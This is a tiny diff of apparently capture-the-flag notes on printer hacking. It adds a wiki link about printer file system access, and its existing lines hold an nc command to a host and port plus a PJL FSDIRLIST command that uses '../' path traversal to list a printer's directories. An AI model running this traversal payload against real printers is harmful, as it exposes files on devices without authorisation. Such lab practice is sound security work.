@@ -1,5 +1,6 @@
 '''
 Printer
+http://hacking-printers.net/wiki/index.php/File_system_access
 
 nc 94.237.54.75 35090
 @PJL FSDIRLIST NAME="0:/../../" ENTRY=1 COUNT=1024
